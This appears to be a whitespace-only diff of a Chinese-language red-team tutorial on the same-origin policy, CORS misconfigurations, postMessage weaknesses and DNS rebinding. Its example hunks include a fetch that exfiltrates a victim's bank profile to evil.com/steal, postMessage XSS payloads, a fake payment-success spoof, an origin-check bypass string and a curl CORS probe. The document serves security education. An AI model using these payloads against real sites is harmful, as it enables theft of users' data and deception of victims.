@@ -19,14 +19,14 @@
 完整Origin：https://login.bank.com:443
 
 同源的组成部分：
-  scheme (https) + host (login.bank.com) + port (443)
+ scheme (https) + host (login.bank.com) + port (443)
 
 判例：
-  https://login.bank.com:443/page1    =  同源
-  https://login.bank.com:443/page2    =  同源（路径无所谓）
-  https://api.bank.com:443/           ≠  同源（子域不同）
-  http://login.bank.com:443/          ≠  同源（协议不同）
-  https://login.bank.com:8443/        ≠  同源（端口不同）
+ https://login.bank.com:443/page1 = 同源
+ https://login.bank.com:443/page2 = 同源（路径无所谓）
+ https://api.bank.com:443/ ≠ 同源（子域不同）
+ http://login.bank.com:443/ ≠ 同源（协议不同）
+ https://login.bank.com:8443/ ≠ 同源（端口不同）
 ```
 
 ### SOP的不对称性
@@ -46,10 +46,10 @@ fetch('https://bank.com/api/data', { mode: 'no-cors' });
 // 不能做的事（读操作）：
 // 1. 读取跨域请求的响应
 fetch('https://bank.com/api/data')
-  .then(r => r.json());  // ← 被CORS阻止
+ .then(r => r.json()); // ← 被CORS阻止
 
 // 2. 读取跨域iframe内容
-document.querySelector('iframe').contentDocument;  // ← SOP阻止
+document.querySelector('iframe').contentDocument; // ← SOP阻止
 
 // 3. 跨域读取cookie/localStorage
 // cookie有Domain和Path限制
@@ -83,8 +83,8 @@ iframe.contentWindow.postMessage('hello', 'https://target.com');
 
 // 接收方
 window.addEventListener('message', (event) => {
-  if (event.origin !== 'https://trusted.com') return;  // ← 必须验证！
-  console.log(event.data);
+ if (event.origin !== 'https://trusted.com') return; // ← 必须验证！
+ console.log(event.data);
 });
 ```
 
@@ -123,8 +123,8 @@ Access-Control-Allow-Credentials: true
 const allowed = ['https://example.com', 'https://www.example.com'];
 
 // 漏洞：只检查了 包含 而不是 完全匹配
-if (allowed.indexOf(origin) >= 0) { ... }   // ✓ 正确
-if (allowed.some(a => origin.includes(a))) { ... }  // ✗ 错误！
+if (allowed.indexOf(origin) >= 0) { ... } // 正确
+if (allowed.some(a => origin.includes(a))) { ... } // 错误！
 
 // origin = 'https://evil.com?x=https://example.com'
 // origin.includes('https://example.com') → true → 绕过！
@@ -158,7 +158,7 @@ Access-Control-Allow-Headers: *
 Access-Control-Allow-Methods: *
 
 # 长缓存时间
-Access-Control-Max-Age: 86400  # 24小时，降低攻击检测窗口
+Access-Control-Max-Age: 86400 # 24小时，降低攻击检测窗口
 ```
 
 ## 四、CORS绕过技术
@@ -207,16 +207,16 @@ targetWindow.postMessage(data, '*');
 
 // 危险模式2：不验证event.origin
 window.addEventListener('message', function(e) {
-  // 不检查 e.origin！
-  eval(e.data);  // ← DOM XSS via postMessage
+ // 不检查 e.origin！
+ eval(e.data); // ← DOM XSS via postMessage
 });
 
 // 危险模式3：不验证消息结构
 window.addEventListener('message', function(e) {
-  // 只检查origin，但未检查data内容
-  if (e.origin === 'https://trusted.com') {
-    document.getElementById('result').innerHTML = e.data.html;  // ← XSS
-  }
+ // 只检查origin，但未检查data内容
+ if (e.origin === 'https://trusted.com') {
+ document.getElementById('result').innerHTML = e.data.html; // ← XSS
+ }
 });
 ```
 
@@ -237,16 +237,16 @@ target.postMessage({ type: 'update', content: '<svg/onload=alert(1)>' }, '*');
 
 ```javascript
 // 模式1：缺少origin检查
-window.addEventListener('message', callback);  // 无origin验证
+window.addEventListener('message', callback); // 无origin验证
 
 // 模式2：正则匹配错误
 if (/trusted\.com$/.test(event.origin)) {
-  // eviltrusted.com 也能通过！
+ // eviltrusted.com 也能通过！
 }
 
 // 模式3：indexOf不够
 if (event.origin.indexOf('trusted.com') > -1) {
-  // nottrusted.com.evil.com 也能通过！
+ // nottrusted.com.evil.com 也能通过！
 }
 ```
 
@@ -257,20 +257,20 @@ if (event.origin.indexOf('trusted.com') > -1) {
 ```
 目标：api.bank.com 的 /user/profile 端点
 配置：Access-Control-Allow-Origin: 反射Origin
-           Access-Control-Allow-Credentials: true
+ Access-Control-Allow-Credentials: true
 
 攻击：
 1. 受害者登录bank.com
 2. 受害者访问evil.com
 3. evil.com执行：
-   fetch('https://api.bank.com/user/profile', {
-     credentials: 'include'
-   })
-   .then(r => r.json())
-   .then(data => fetch('https://evil.com/steal', {
-     method: 'POST',
-     body: JSON.stringify(data)
-   }));
+ fetch('https://api.bank.com/user/profile', {
+ credentials: 'include'
+ })
+ .then(r => r.json())
+ .then(data => fetch('https://evil.com/steal', {
+ method: 'POST',
+ body: JSON.stringify(data)
+ }));
 4. 攻击者获取受害者的个人资料（可能含邮箱、电话等）
 5. 用这些信息进行社工 / 密码重置
 ```
@@ -285,7 +285,7 @@ if (event.origin.indexOf('trusted.com') > -1) {
 1. 受害者访问evil.com
 2. evil.com打开 https://payment-processor.com/checkout
 3. evil.com发送postMessage：
-   postMessage({html: '<div>付款成功！商品将发送至您地址</div>'}, '*')
+ postMessage({html: '<div>付款成功！商品将发送至您地址</div>'}, '*')
 4. 页面显示虚假成功消息
 5. 受害者以为支付成功，实际未完成/款项转到攻击者
 ```
@@ -307,13 +307,13 @@ if (event.origin.indexOf('trusted.com') > -1) {
 ```
 1. 注册 evil.com → DNS TTL=1秒
 2. 第0秒：evil.com → 攻击者IP (5.6.7.8)
-   受害者加载 evil.com 页面
-   页面中的JS开始polling
+ 受害者加载 evil.com 页面
+ 页面中的JS开始polling
 
 3. 第2秒：evil.com → 内网IP (192.168.1.1)
-   DNS TTL过期，JavaScript发出新请求
-   浏览器认为仍在同一"源"（evil.com）
-   JS可以读取 192.168.1.1 的响应！（SOP被绕过）
+ DNS TTL过期，JavaScript发出新请求
+ 浏览器认为仍在同一"源"（evil.com）
+ JS可以读取 192.168.1.1 的响应！（SOP被绕过）
 ```
 
 ## 八、红队视角总结
@@ -334,7 +334,7 @@ if (event.origin.indexOf('trusted.com') > -1) {
 ```bash
 # 检查CORS配置
 curl -sI -H "Origin: https://evil.com" https://api.target.com/endpoint \
-  | grep -i 'access-control'
+ | grep -i 'access-control'
 
 # 如果有 Access-Control-Allow-Origin: https://evil.com
 # + Access-Control-Allow-Credentials: true
